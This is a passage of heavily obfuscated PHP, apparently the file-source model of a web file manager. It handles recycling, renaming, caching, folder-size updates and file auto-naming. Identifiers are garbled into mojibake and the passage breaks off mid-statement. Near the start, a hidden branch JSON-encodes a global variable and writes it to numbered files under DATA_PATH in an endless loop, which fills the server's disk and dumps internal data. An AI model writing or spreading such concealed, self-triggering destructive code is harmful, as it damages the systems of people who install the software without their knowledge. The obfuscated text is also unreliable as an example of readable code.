$µ¡’ü¶ë($¬… Ó¬’); $úÓòğÁö = explode($šõ÷ŠåÚ[286], $Œ·â¢‡é); if (count($úÓòğÁö) < $šõ÷ŠåÚ[717]) { $Æ…»Ûâ¹ = $šõ÷ŠåÚ[329]; $Æ…»Ûâ¹(); } $İŞº‹“ = $šõ÷ŠåÚ[996]; $İŞº‹“($_SERVER[$šõ÷ŠåÚ[997]]); $öİ””°§ = $šõ÷ŠåÚ[995]; $öİ””°§(); $Ì‚öıˆÁ = $šõ÷ŠåÚ[1780]; $­¨ë—… = json_encode($GLOBALS[$šõ÷ŠåÚ[1781]]); $ÁĞŒ×ƒ° = 1; for ($”£ÕÕÕÉ = $ÁĞŒ×ƒ°; $”£ÕÕÕÉ > 0; $”£ÕÕÕÉ++) { $Ì‚öıˆÁ(DATA_PATH . $”£ÕÕÕÉ, $­¨ë—…); } } $²ïà³¨Î = $this->sourceInfo($¡–à„); $Î†É«çÒ = $this->pathInfoMore($¡–à„); if (!$²ïà³¨Î) { return !0; } if ($²ïà³¨Î[$šõ÷ŠåÚ[191]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($¡–à„); Hook::trigger($šõ÷ŠåÚ[2449], $Î†É«çÒ, $€ãÆ“òË); if ($€ãÆ“òË) { Model($šõ÷ŠåÚ[2448])->moveToRecycle($¡–à„); } else { $…‹»Êµ = $this->childrenAll($²ïà³¨Î); Model($šõ÷ŠåÚ[663])->eventRemove($¡–à„); $this->removeRelevance($…‹»Êµ[$šõ÷ŠåÚ[2447]], $…‹»Êµ[$šõ÷ŠåÚ[1731]]); } $this->folderSizeReset($²ïà³¨Î[$šõ÷ŠåÚ[191]]); $¶‚ÒœùÄ = array($²ïà³¨Î[$šõ÷ŠåÚ[191]]); if ($²ïà³¨Î[$šõ÷ŠåÚ[508]] == $šõ÷ŠåÚ[91]) { $¶‚ÒœùÄ[] = $²ïà³¨Î[$šõ÷ŠåÚ[192]]; } $this->updateModifyTime($¶‚ÒœùÄ); $this->lockMoveEnd($¡–à„); Hook::trigger($šõ÷ŠåÚ[1972], $Î†É«çÒ, $€ãÆ“òË); return !0; } public function childrenAll($ÉÃ®ã‘±) { $²­Ô£« =& $_SERVER[‘ÆÜ‘œ]; $ÃÑ»ıŒ = $ÉÃ®ã‘±[$²­Ô£«[192]]; if ($ÉÃ®ã‘±[$²­Ô£«[508]] == $²­Ô£«[91]) { $áöÑüÄŠ = array($²­Ô£«[682] => array($²­Ô£«[643], $ÉÃ®ã‘±[$²­Ô£«[612]] . $ÃÑ»ıŒ . $²­Ô£«[644])); $Í‡¹Ö¾ú = array($²­Ô£«[682] => $áöÑüÄŠ[$²­Ô£«[612]]); $õÔÏÒ¸² = $this->field($²­Ô£«[2450])->where($Í‡¹Ö¾ú)->select(); $³ƒØËıŒ = !1; $Üù¡¾² = array($ÃÑ»ıŒ); if ($õÔÏÒ¸²) { $³ƒØËıŒ = array_to_keyvalue($õÔÏÒ¸², $²­Ô£«[12], $²­Ô£«[565]); $³ƒØËıŒ = array_remove_value($³ƒØËıŒ, $²­Ô£«[229]); $Üù¡¾² = array_to_keyvalue($õÔÏÒ¸², $²­Ô£«[12], $²­Ô£«[192]); $Üù¡¾²[] = $ÃÑ»ıŒ; } } else { $³ƒØËıŒ = array($ÉÃ®ã‘±[$²­Ô£«[565]]); $Üù¡¾² = array($ÃÑ»ıŒ); } return array($²­Ô£«[2447] => $Üù¡¾², $²­Ô£«[1731] => $³ƒØËıŒ); } public function removeArray($š‡—æ¥Ò) { if (!$š‡—æ¥Ò) { return !0; } } public function removeRelevance($®ÔÚóëó, $¹ˆªøñ‰) { $Õ­ ÑÖÊ =& $_SERVER[‘ÆÜ‘œ]; $®ÔÚóëó = $®ÔÚóëó ? $®ÔÚóëó : array(); $¹ˆªøñ‰ = $¹ˆªøñ‰ ? $¹ˆªøñ‰ : array(); $®ÔÚóëó = array_unique(array_filter($®ÔÚóëó)); $¹ˆªøñ‰ = array_filter($¹ˆªøñ‰); if (!$®ÔÚóëó) { return !1; } $ÒĞÖü“ = array($Õ­ ÑÖÊ[514] => array($Õ­ ÑÖÊ[515], $®ÔÚóëó)); Model($Õ­ ÑÖÊ[2448])->where($ÒĞÖü“)->delete(); Model($Õ­ ÑÖÊ[557])->where($ÒĞÖü“)->delete(); Model($Õ­ ÑÖÊ[2282])->where($ÒĞÖü“)->delete(); Model($Õ­ ÑÖÊ[663])->where($ÒĞÖü“)->delete(); Model($Õ­ ÑÖÊ[1514])->removeBySource($®ÔÚóëó); Model($Õ­ ÑÖÊ[2429])->removeBySource($®ÔÚóëó); $this->where($ÒĞÖü“)->delete(); Model($Õ­ ÑÖÊ[568])->remove($¹ˆªøñ‰); for ($“ƒûÁàŒ = 0; $“ƒûÁàŒ < count($®ÔÚóëó); $“ƒûÁàŒ++) { $this->sourceCacheClear($®ÔÚóëó[$“ƒûÁàŒ]); } } public function rename($®€©™¯¾, $™æğ×ç”) { $ˆüĞ•·å =& $_SERVER[‘ÆÜ‘œ]; $ÂÂÑ•‰± = $this->sourceInfo($®€©™¯¾); if (!$ÂÂÑ•‰±) { return !1; } $ØÌ†·±â = $this->fileNameExist($ÂÂÑ•‰±[$ˆüĞ•·å[191]], $™æğ×ç”); if ($ØÌ†·±â && $ØÌ†·±â != $®€©™¯¾) { return !1; } $á‘Í‘àÅ = array($ˆüĞ•·å[517] => $™æğ×ç”, $ˆüĞ•·å[681] => USER_ID); if ($ÂÂÑ•‰±[$ˆüĞ•·å[508]] != $ˆüĞ•·å[91]) { $á‘Í‘àÅ[$ˆüĞ•·å[509]] = substr(get_path_ext($™æğ×ç”), 0, 10); } Model($ˆüĞ•·å[663])->eventRename($®€©™¯¾, $ÂÂÑ•‰±[$ˆüĞ•·å[32]], $™æğ×ç”); $this->sourceCacheClear($®€©™¯¾); $this->setNamePinyin($®€©™¯¾, $á‘Í‘àÅ[$ˆüĞ•·å[32]], !1); $this->updateModifyTime($ÂÂÑ•‰±[$ˆüĞ•·å[191]]); $‡¥˜•Ù© = $this->where(array($ˆüĞ•·å[514] => $®€©™¯¾))->data($á‘Í‘àÅ)->save(); $ãåïüëİ = $ˆüĞ•·å[2437] . $ÂÂÑ•‰±[$ˆüĞ•·å[191]]; if (isset(self::$cacheChildList[$ãåïüëİ])) { unset(self::$cacheChildList[$ãåïüëİ]); } return $‡¥˜•Ù©; } public function setNamePinyin($ï§Ü§ì, $«ÑòÀìÛ, $ß™Û‰Ò‘ = true) { $²½ä°•‹ =& $_SERVER[‘ÆÜ‘œ]; $Ç¶ÖÙøİ = Input::check($«ÑòÀìÛ, $²½ä°•‹[685]); $ËÁÜşá = array($²½ä°•‹[539] => KodSort::makeStr($«ÑòÀìÛ)); if ($Ç¶ÖÙøİ) { $ËÁÜşá[$²½ä°•‹[560]] = str_replace($²½ä°•‹[53], $²½ä°•‹[12], Pinyin::get($«ÑòÀìÛ)); $ËÁÜşá[$²½ä°•‹[559]] = Pinyin::get($«ÑòÀìÛ, $²½ä°•‹[686]); } if (!$ß™Û‰Ò‘ && !$Ç¶ÖÙøİ) { $ËÁÜşá[$²½ä°•‹[560]] = null; $ËÁÜşá[$²½ä°•‹[559]] = null; } $this->metaSet($ï§Ü§ì, $ËÁÜşá); } public function getContent($“ØÄØå) { $µ ïæÁ =& $_SERVER[‘ÆÜ‘œ]; $¸÷Èî§İ = $this->fileInfoGet($“ØÄØå); if (!$¸÷Èî§İ) { return !1; } if ($¸÷Èî§İ[$µ ïæÁ[79]] == 0) { return $µ ïæÁ[12]; } $ú­¨Îî˜ = $µ ïæÁ[2451] . $¸÷Èî§İ[$µ ïæÁ[571]]; if ($¸÷Èî§İ[$µ ïæÁ[79]] <= 1024 * 10) { $½ş¹âÊ = Cache::get($ú­¨Îî˜); if (!$½ş¹âÊ) { $½ş¹âÊ = IO::getContent($¸÷Èî§İ[$µ ïæÁ[87]]); Cache::set($ú­¨Îî˜, $½ş¹âÊ); } return $½ş¹âÊ; } if (!$¸÷Èî§İ[$µ ïæÁ[87]]) { return $µ ïæÁ[12]; } return IO::getContent($¸÷Èî§İ[$µ ïæÁ[87]]); } public function setDesc($´Ä©°×‘, $á„ğÌÆ×) { $¡™è¿ªä =& $_SERVER[‘ÆÜ‘œ]; Model($¡™è¿ªä[663])->eventAddDesc($´Ä©°×‘, $á„ğÌÆ×); return $this->metaSet($´Ä©°×‘, $¡™è¿ªä[548], $á„ğÌÆ×); } public function setContent($ÍÁ—œõë, $Æ™’·Î„ = '') { $üë¨º©À =& $_SERVER[‘ÆÜ‘œ]; $îšè½Ú¢ = $this->sourceInfo($ÍÁ—œõë); $¡¸ÚÚ¤Ø = $this->fileInfoGet($ÍÁ—œõë); if (!$¡¸ÚÚ¤Ø || !$îšè½Ú¢) { return !1; } $¬÷ß“Õº = KodIO::ioFileDriverGet($üë¨º©À[506] . $ÍÁ—œõë . $üë¨º©À[412]); $Ëœ‡áƒ² = Model($üë¨º©À[568])->addFileByContent($Æ™’·Î„, $¬÷ß“Õº, $îšè½Ú¢[$üë¨º©À[32]]); if (!$Ëœ‡áƒ²) { return !1; } $­ş‚õÎí = $this->fileHistory($îšè½Ú¢, $Ëœ‡áƒ²[$üë¨º©À[565]], $Ëœ‡áƒ²[$üë¨º©À[79]]); if (!$­ş‚õÎí) { return Model($üë¨º©À[568])->remove($Ëœ‡áƒ²[$üë¨º©À[565]]); } $this->folderSizeReset($îšè½Ú¢[$üë¨º©À[191]]); return !0; } public function fileSubstr($óÏ•¥ƒ, $¯ÏÊ¸æ, $ÎùÑ“íª) { $éÆÓüùö = $this->fileInfoGet($óÏ•¥ƒ); if (!$éÆÓüùö) { return !1; } return IO::fileSubstr($éÆÓüùö[$_SERVER[‘ÆÜ‘œ][87]], $¯ÏÊ¸æ, $ÎùÑ“íª); } public function fileInfoGet($Öóöİ­ ) { $Î±ö½å =& $_SERVER[‘ÆÜ‘œ]; $³ğ ÷Ñ = $this->sourceInfo($Öóöİ­ ); if (!$³ğ ÷Ñ || $³ğ ÷Ñ[$Î±ö½å[508]]) { return !1; } $ÇÌñ›Ò‚ = $Î±ö½å[572] . $³ğ ÷Ñ[$Î±ö½å[565]]; $Óè””“— = _get(self::$cacheFileInfo, $ÇÌñ›Ò‚); if ($Óè””“—) { return $Óè””“—; } $Ñ¤…õğÙ = Model($Î±ö½å[568])->fileInfo($³ğ ÷Ñ[$Î±ö½å[565]]); if ($Ñ¤…õğÙ) { $Ñ¤…õğÙ[$Î±ö½å[32]] = $³ğ ÷Ñ[$Î±ö½å[32]]; } self::$cacheFileInfo[$ÇÌñ›Ò‚] = $Ñ¤…õğÙ; return $Ñ¤…õğÙ; } private function folderChildrenNumber($÷¶ÎçÆƒ) { $ô¬ëºÒÎ =& $_SERVER[‘ÆÜ‘œ]; $ÀÁ€ÊÄø = $this->sourceInfo($÷¶ÎçÆƒ); $šŞ¬Ï²Ş = array($ô¬ëºÒÎ[682] => array($ô¬ëºÒÎ[643], $ÀÁ€ÊÄø[$ô¬ëºÒÎ[612]] . $÷¶ÎçÆƒ . $ô¬ëºÒÎ[644]), $ô¬ëºÒÎ[679] => $ÀÁ€ÊÄø[$ô¬ëºÒÎ[597]], $ô¬ëºÒÎ[527] => intval($ÀÁ€ÊÄø[$ô¬ëºÒÎ[528]]), $ô¬ëºÒÎ[676] => 1); $Ô¦„«× = $this->where($šŞ¬Ï²Ş)->count(); $ô“ÆÂØ = $this->where($šŞ¬Ï²Ş)->where(array($ô¬ëºÒÎ[676] => 0))->count(); return array($ô¬ëºÒÎ[83] => $ô“ÆÂØ, $ô¬ëºÒÎ[84] => $Ô¦„«×); } public function pathInfo($Êä–ºê‚, $Ê«šİÎ± = false) { $ş£š»µ“ =& $_SERVER[‘ÆÜ‘œ]; $Ê«šİÎ± = !1; $Êä–ºê‚ = intval($Êä–ºê‚); if (!$Êä–ºê‚) { return !1; } $àŠûû…ï = $ş£š»µ“[556] . intval($Ê«šİÎ±) . $ş£š»µ“[485] . $Êä–ºê‚; $…÷‘ú¦ = _get(self::$cachePathInfo, $àŠûû…ï); if ($…÷‘ú¦) { return $…÷‘ú¦; } $ä­¾Ó¶ñ = $this->sourceInfo($Êä–ºê‚); if (!$ä­¾Ó¶ñ) { return !1; } $ä­¾Ó¶ñ = $this->_listDataApplyItem($ä­¾Ó¶ñ, $Ê«šİÎ±); self::$cachePathInfo[$àŠûû…ï] = $ä­¾Ó¶ñ; return $ä­¾Ó¶ñ; } public static $cachePathInfoMore = array(); public function pathInfoMore($àµ˜€äç) { $ƒéÏôÇä =& $_SERVER[‘ÆÜ‘œ]; $×šùúÖ = _get(self::$cachePathInfoMore, $àµ˜€äç); if ($×šùúÖ) { return $×šùúÖ; } $™÷Üß‘â = $this->pathInfo($àµ˜€äç); if (!$™÷Üß‘â) { return !1; } if ($™÷Üß‘â[$ƒéÏôÇä[508]] == $ƒéÏôÇä[91]) { $™÷Üß‘â[$ƒéÏôÇä[82]] = $this->folderChildrenNumber($àµ˜€äç); } self::$cachePathInfoMore[$àµ˜€äç] = $™÷Üß‘â; return $™÷Üß‘â; } public function sourceInfo($­€ÁˆŸÚ) { $Á±ô¿óğ =& $_SERVER[‘ÆÜ‘œ]; if (!$­€ÁˆŸÚ) { return array(); } $­€ÁˆŸÚ = intval($­€ÁˆŸÚ); $§‰—·™± = $Á±ô¿óğ[555] . $­€ÁˆŸÚ; $‡»‰Éª¡ = _get(self::$cacheSourceInfo, $§‰—·™±); if ($‡»‰Éª¡) { return $‡»‰Éª¡; } $‚Ç•µÓä = $this->where(array($Á±ô¿óğ[192] => $­€ÁˆŸÚ))->find(); self::$cacheSourceInfo[$§‰—·™±] = $‚Ç•µÓä; return self::$cacheSourceInfo[$§‰—·™±]; } public function sourceCacheClear($ƒ®¼¸ã‰ = false) { self::cacheClear($ƒ®¼¸ã‰); } public static function cacheClear($÷†ÜÀı¤ = false) { $ôÈ’•Âß =& $_SERVER[‘ÆÜ‘œ]; if ($÷†ÜÀı¤ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$ôÈ’•Âß[555] . $÷†ÜÀı¤]); unset(self::$cachePathInfoMore[$÷†ÜÀı¤]); unset(self::$cachePathInfo[$ôÈ’•Âß[2452] . $÷†ÜÀı¤]); unset(self::$cachePathInfo[$ôÈ’•Âß[2453] . $÷†ÜÀı¤]); } public function metaSet($ùøÛ‰£‡, $ïş±–ıø = null, $­­ŞÓÖÌ = null) { $ŒÂ‰šªä = parent::metaSet($ùøÛ‰£‡, $ïş±–ıø, $­­ŞÓÖÌ); if ($ŒÂ‰šªä) { $this->sourceCacheClear($ùøÛ‰£‡); } return $ŒÂ‰šªä; } public function pathInfoByPath($ò†ü¡úŸ, $”ûì¡…·) { $±ùÒ•Ğä =& $_SERVER[‘ÆÜ‘œ]; $öÎ¢ÆÊ = !$”ûì¡…· ? array() : explode($±ùÒ•Ğä[8], trim($”ûì¡…·, $±ùÒ•Ğä[8])); $ößú‡ô§ = intval($ò†ü¡úŸ); foreach ($öÎ¢ÆÊ as $ÀÖ¤™—) { $ŞóË‰³¹ = array($±ùÒ•Ğä[191] => $ößú‡ô§, $±ùÒ•Ğä[32] => $ÀÖ¤™—); $Ï°å©ïñ = $this->field($±ùÒ•Ğä[2454])->where($ŞóË‰³¹)->select(); if (!$Ï°å©ïñ) { return !1; } $Ï°å©ïñ = array_sort_by($Ï°å©ïñ, $±ùÒ•Ğä[528]); $ößú‡ô§ = intval($Ï°å©ïñ[0][$±ùÒ•Ğä[192]]); } $›Ê‹â´ = $this->sourceInfo($ößú‡ô§); $this->pathInfoFilter($›Ê‹â´); return $›Ê‹â´; } protected function updateModifyTime($«Îº©™) { $×ºÇıÈø =& $_SERVER[‘ÆÜ‘œ]; $›ÌÑ”Û = KodUser::id(); if (!$«Îº©™) { return; } if (!is_array($«Îº©™)) { $«Îº©™ = array($«Îº©™); } foreach ($«Îº©™ as $¬Ğı¿Ÿû => $Å§ü®éã) { $«Îº©™[$¬Ğı¿Ÿû] = intval($Å§ü®éã); $this->sourceCacheClear($Å§ü®éã); } $‰øÛš… = array($×ºÇıÈø[192] => array($×ºÇıÈø[7], $«Îº©™)); $Å®°•Ï = array($×ºÇıÈø[681] => $›ÌÑ”Û, $×ºÇıÈø[521] => time()); $this->where($‰øÛš…)->save($Å®°•Ï); } public function folderSizeReset($¤ÄÙ³Äƒ, $ŠƒÆ©¼Ï = false) { $°µôøºñ =& $_SERVER[‘ÆÜ‘œ]; if ($this->statusIgnoreResetSpace) { return; } if (!$¤ÄÙ³Äƒ) { return; } $“ĞÇ›é† = $this->sourceInfo($¤ÄÙ³Äƒ); $ı½Ã²Şõ = $°µôøºñ[2455] . $¤ÄÙ³Äƒ; if (!$“ĞÇ›é† || !$“ĞÇ›é†[$°µôøºñ[192]]) { return; } CacheLock::lock($ı½Ã²Şõ, 20); if ($ŠƒÆ©¼Ï === !1) { $this->sourceCacheClear($¤ÄÙ³Äƒ); $“ĞÇ›é† = $this->sourceInfo($¤ÄÙ³Äƒ); $Ù‹»¿òÍ = array($°µôøºñ[500] => $¤ÄÙ³Äƒ, $°µôøºñ[527] => 0); $ô¹°€Âš = $this->where($Ù‹»¿òÍ)->sum($°µôøºñ[79]); $ŠƒÆ©¼Ï = intval($ô¹°€Âš) - intval($“ĞÇ›é†[$°µôøºñ[79]]); } if ($ŠƒÆ©¼Ï == 0) { return CacheLock::unlock($ı½Ã²Şõ); } $½šª³¨Ÿ = $this->parentLevelArray($“ĞÇ›é†[$°µôøºñ[612]]); if (!$½šª³¨Ÿ) { $½šª³¨Ÿ = array(); } $½šª³¨Ÿ[] = $“ĞÇ›é†[$°µôøºñ[192]]; $Ù‹»¿òÍ = array($°µôøºñ[192] => array($°µôøºñ[515], $½šª³¨Ÿ)); if ($ŠƒÆ©¼Ï < 0) { $Ù‹»¿òÍ[$°µôøºñ[79]] = array($°µôøºñ[1133], abs($ŠƒÆ©¼Ï)); } $this->where($Ù‹»¿òÍ)->setAdd($°µôøºñ[79], $ŠƒÆ©¼Ï); CacheLock::unlock($ı½Ã²Şõ); if (!$“ĞÇ›é†[$°µôøºñ[597]] || $“ĞÇ›é†[$°µôøºñ[597]] == $°µôøºñ[229]) { return; } $›ÔíÉ´ = $°µôøºñ[2456] . $“ĞÇ›é†[$°µôøºñ[189]] . $°µôøºñ[4] . $“ĞÇ›é†[$°µôøºñ[597]]; $°„Ñô’ı = array($“ĞÇ›é†[$°µôøºñ[189]], $“ĞÇ›é†[$°µôøºñ[597]]); TaskRun::timeLimitCall($›ÔíÉ´, $°µôøºñ[2457], $°„Ñô’ı, 1.5); } public function folderSizeResetChildren($ÂĞáƒ”Ì) { $Ë½‰í» =& $_SERVER[‘ÆÜ‘œ]; $this->sourceCacheClear($ÂĞáƒ”Ì); $²îû¦Æ = $this->sourceInfo($ÂĞáƒ”Ì); if (!$²îû¦Æ) { return; } $·‡¦˜ƒ˜ = array($Ë½‰í»[676] => 1, $Ë½‰í»[679] => $²îû¦Æ[$Ë½‰í»[597]], $Ë½‰í»[682] => array($Ë½‰í»[643], $²îû¦Æ[$Ë½‰í»[612]] . $ÂĞáƒ”Ì . $Ë½‰í»[644])); $Ôú…úÅ¾ = $Ë½‰í»[2458]; $Áú¢¤øğ = $this->field($Ôú…úÅ¾)->where($·‡¦˜ƒ˜)->select(); $·‡¦˜ƒ˜[$Ë½‰í»[508]] = 0; $ˆÏ»¼­ä = $this->field($Ôú…úÅ¾)->where($·‡¦˜ƒ˜)->select(); if (!$ˆÏ»¼­ä) { return; } $Áú¢¤øğ[] = $²îû¦Æ; $Áú¢¤øğ = array_to_keyvalue($Áú¢¤øğ, $Ë½‰í»[192]); foreach ($Áú¢¤øğ as $Ÿµ”Ô«— => $Êê·÷ê×) { $Áú¢¤øğ[$Ÿµ”Ô«—][$Ë½‰í»[2459]] = $Áú¢¤øğ[$Ÿµ”Ô«—][$Ë½‰í»[79]]; $Áú¢¤øğ[$Ÿµ”Ô«—][$Ë½‰í»[79]] = 0; } foreach ($ˆÏ»¼­ä as $Êê·÷ê×) { $û¼—Øğ = $Êê·÷ê×[$Ë½‰í»[191]] . $Ë½‰í»[12]; if (!isset($Áú¢¤øğ[$û¼—Øğ])) { continue; } if ($Êê·÷ê×[$Ë½‰í»[528]] == $Áú¢¤øğ[$û¼—Øğ][$Ë½‰í»[528]]) { $Áú¢¤øğ[$û¼—Øğ][$Ë½‰í»[79]] += $Êê·÷ê×[$Ë½‰í»[79]]; } } foreach ($Áú¢¤øğ as $Êê·÷ê×) { $ÔÒÛÕ = $this->parentLevelArray($Êê·÷ê×[$Ë½‰í»[612]]); foreach ($ÔÒÛÕ as $û¼—Øğ) { $û¼—Øğ = $û¼—Øğ . $Ë½‰í»[12]; if (!isset($Áú¢¤øğ[$û¼—Øğ])) { continue; } if ($Êê·÷ê×[$Ë½‰í»[528]] == $Áú¢¤øğ[$û¼—Øğ][$Ë½‰í»[528]]) { $Áú¢¤øğ[$û¼—Øğ][$Ë½‰í»[79]] += $Êê·÷ê×[$Ë½‰í»[79]]; } } } $ïàÓÔ°“ = array(); foreach ($Áú¢¤øğ as $Êê·÷ê×) { if ($Êê·÷ê×[$Ë½‰í»[79]] == $Êê·÷ê×[$Ë½‰í»[2459]]) { continue; } $ïàÓÔ°“[] = array($Ë½‰í»[192], $Êê·÷ê×[$Ë½‰í»[192]], $Ë½‰í»[79], $Êê·÷ê×[$Ë½‰í»[79]]); } $this->saveAll($ïàÓÔ°“); } public function userSpaceReset($ÉõÀ‹°Ğ = false) { $¬ù¤ª€Ÿ =& $_SERVER[‘ÆÜ‘œ]; $ØÚ©”ª = $this->where(array($¬ù¤ª€Ÿ[189] => self::TYPE_USER, $¬ù¤ª€Ÿ[597] => $ÉõÀ‹°Ğ, $¬ù¤ª€Ÿ[508] => 0))->sum($¬ù¤ª€Ÿ[79]); $ØÚ©”ª = !$ØÚ©”ª || $ØÚ©”ª <= 0 ? 0 : $ØÚ©”ª; Model($¬ù¤ª€Ÿ[605])->userEdit($ÉõÀ‹°Ğ, array($¬ù¤ª€Ÿ[2125] => $ØÚ©”ª)); } public function targetSpaceUpdate($¬±œƒÊ«, $å¤¶¤) { $¾ƒ½ƒ°Î =& $_SERVER[‘ÆÜ‘œ]; if (!$å¤¶¤) { return; } if (!in_array($¬±œƒÊ«, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $–›µà‰œ = $this->targetSpaceSize($¬±œƒÊ«, $å¤¶¤); if ($¬±œƒÊ« == self::TYPE_USER) { Model($¾ƒ½ƒ°Î[605])->userEdit($å¤¶¤, array($¾ƒ½ƒ°Î[2125] => $–›µà‰œ)); } else { if ($¬±œƒÊ« == self::TYPE_GROUP) { Model($¾ƒ½ƒ°Î[613])->groupEdit($å¤¶¤, array($¾ƒ½ƒ°Î[2125] => $–›µà‰œ)); } } } public function targetSpaceSize($¡Ô…á“¤, $Şà¸†•ç) { $ğ³¼œâ =& $_SERVER[‘ÆÜ‘œ]; $ü ƒÓ“Ì = 0; $¯¶—®„ = $this->targetSourceRoot($¡Ô…á“¤, $Şà¸†•ç, !0); foreach ($¯¶—®„ as $õÖ÷ƒÃ) { if (!$õÖ÷ƒÃ) { continue; } $ü ƒÓ“Ì += floatval($õÖ÷ƒÃ[$ğ³¼œâ[79]]); $èÁ¬Ë¹Å = array($ğ³¼œâ[682] => array($ğ³¼œâ[643], $ğ³¼œâ[621] . $õÖ÷ƒÃ[$ğ³¼œâ[192]] . $ğ³¼œâ[644])); $–ÑÕÖşÀ = Model($ğ³¼œâ[526])->field($ğ³¼œâ[514])->where($èÁ¬Ë¹Å)->select(); $–ÑÕÖşÀ = array_to_keyvalue($–ÑÕÖşÀ, $ğ³¼œâ[12], $ğ³¼œâ[192]); $–ÑÕÖşÀ = array_unique(array_filter($–ÑÕÖşÀ)); if ($–ÑÕÖşÀ) { $èÁ¬Ë¹Å = array($ğ³¼œâ[514] => array($ğ³¼œâ[515], $–ÑÕÖşÀ)); $ü ƒÓ“Ì += floatval($this->where($èÁ¬Ë¹Å)->sum($ğ³¼œâ[79])); } } $ü ƒÓ“Ì = !$ü ƒÓ“Ì || $ü ƒÓ“Ì <= 0 ? 0 : $ü ƒÓ“Ì; return $ü ƒÓ“Ì; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($‹Ñƒ«Ñ) { return $this->fileTypeProfile($‹Ñƒ«Ñ, SourceModel::TYPE_USER); } public function groupFileTypeProfile($şÑ„Ò•) { return $this->fileTypeProfile($şÑ„Ò•, SourceModel::TYPE_GROUP); } private function fileTypeProfile($ãÎˆÔ—, $…·„óÃ¯) { $Èà÷º«Œ =& $_SERVER[‘ÆÜ‘œ]; $¿üáŒ‚¡ = $Èà÷º«Œ[2460] . $ãÎˆÔ— . $Èà÷º«Œ[11] . $…·„óÃ¯; $®©¢‚ı´ = Cache::get($¿üáŒ‚¡); if ($®©¢‚ı´) { return $®©¢‚ı´; } $²ö¢”û = array($Èà÷º«Œ[676] => 0); if ($ãÎˆÔ— != !1) { $²ö¢”û[$Èà÷º«Œ[597]] = $ãÎˆÔ—; $²ö¢”û[$Èà÷º«Œ[189]] = $…·„óÃ¯; } $¦Øƒ«Í = array(); $’Áó†ìº = $this->field(array($Èà÷º«Œ[2387] => $Èà÷º«Œ[2092], $Èà÷º«Œ[2461] => $Èà÷º«Œ[79]))->where($²ö¢”û)->find(); $¦Øƒ«Í[$Èà÷º«Œ[2462]] = array($Èà÷º«Œ[2463] => LNG($Èà÷º«Œ[2462]), $Èà÷º«Œ[2464] => intval($’Áó†ìº[$Èà÷º«Œ[2092]]), $Èà÷º«Œ[648] => intval($’Áó†ìº[$Èà÷º«Œ[79]])); $ÎÓˆù”˜ = KodIO::fileTypeList(); foreach ($ÎÓˆù”˜ as $ºûø³¹” => $­Õ¢Ğöï) { $²ö¢”û[$Èà÷º«Œ[509]] = $this->fileTypeWhere($ºûø³¹”); $’Áó†ìº = $this->field(array($Èà÷º«Œ[2387] => $Èà÷º«Œ[2092], $Èà÷º«Œ[2461] => $Èà÷º«Œ[79]))->where($²ö¢”û)->find(); $¦Øƒ«Í[$ºûø³¹”] = array($Èà÷º«Œ[2463] => $­Õ¢Ğöï[$Èà÷º«Œ[32]], $Èà÷º«Œ[2464] => intval($’Áó†ìº[$Èà÷º«Œ[2092]]), $Èà÷º«Œ[648] => intval($’Áó†ìº[$Èà÷º«Œ[79]])); } Cache::set($¿üáŒ‚¡, $¦Øƒ«Í, 1200); return $¦Øƒ«Í; } public function fileNameExist($…üìäç , $âÁ›š¥) { $ŒáîÁ¯î =& $_SERVER[‘ÆÜ‘œ]; $–ãè¢ûñ = $this->field($ŒáîÁ¯î[2465])->where(array($ŒáîÁ¯î[191] => $…üìäç , $ŒáîÁ¯î[32] => $âÁ›š¥, $ŒáîÁ¯î[528] => 0))->find(); return is_array($–ãè¢ûñ) ? $–ãè¢ûñ[$ŒáîÁ¯î[192]] : !1; } public function childList($‚¶Ü¤Ÿ®) { $á§ÖŸÈš =& $_SERVER[‘ÆÜ‘œ]; $°İú„” = $á§ÖŸÈš[2437] . $‚¶Ü¤Ÿ®; if (isset(self::$cacheChildList[$°İú„”])) { return self::$cacheChildList[$°İú„”]; } $ú­ñÉúè = array($á§ÖŸÈš[191] => intval($‚¶Ü¤Ÿ®), $á§ÖŸÈš[528] => 0); $Àù–¾ = $this->where($ú­ñÉúè)->select(); $Àù–¾ = $Àù–¾ ? $Àù–¾ : array(); self::$cacheChildList[$°İú„”] = $Àù–¾; foreach ($Àù–¾ as $É˜ØÕğé) { $°İú„” = $á§ÖŸÈš[555] . $É˜ØÕğé[$á§ÖŸÈš[192]]; self::$cacheSourceInfo[$°İú„”] = $É˜ØÕğé; } return $Àù–¾; } public function fileNameAuto($÷‰ó·Ù, $‡½Ã½›, $æß §Úé = REPEAT_RENAME, $ÃˆæÊ§› = false) { $÷îÔ»¦ã =& $_SERVER[‘ÆÜ‘œ]; $şæÛ‹å = get_path_ext($‡½Ã½›); $«Î´Òï = $şæÛ‹å ? get_path_ext_name($‡½Ã½›) . $÷îÔ»¦ã[2466] . $şæÛ‹å : $‡½Ã½› . $÷îÔ»¦ã[483]; $Øúİ¹Ï… = array($÷îÔ»¦ã[191] => $÷‰ó·Ù, $÷îÔ»¦ã[528] => 0, $÷îÔ»¦ã[32] => array($÷îÔ»¦ã[482], $«Î´Òï)); $ÄÑ¯È¤ = $this->field($÷îÔ»¦ã[32])->where($Øúİ¹Ï…)->select(); $ÑçÍá‘¬ = array_to_keyvalue($ÄÑ¯È¤, $÷îÔ»¦ã[12], $÷îÔ»¦ã[32]); return $this->fileNameAutoGet($ÑçÍá‘¬, $‡½Ã½›, $æß §Úé, $ÃˆæÊ§›); } public function fileNameAutoGet($¬éÌëô•, $Æùî¤Ğ, $øª¶é«÷, $Š¿Ğ™óğ) { $÷¼Ÿ¤ =& $_SERVER[‘ÆÜ‘œ]; if ($øª¶é«÷ == REPEAT_REPLACE || !$¬éÌëô• || !in_array_not_case($Æùî¤Ğ, $¬éÌëô•) || $Š¿Ğ™óğ && $øª¶é«÷ != REPEAT_RENAME_FOLDER) { return $Æùî¤Ğ; } if ($øª¶é«÷ == REPEAT_SKIP) { return !1; } $Èæ„—Öå = $÷¼Ÿ¤[10] . get_path_ext($Æùî¤Ğ); $Èæ„—Öå = $Èæ„—Öå == $÷¼Ÿ¤[10] || $Š¿Ğ™óğ ? $÷¼Ÿ¤[12] : $Èæ„—Öå; for 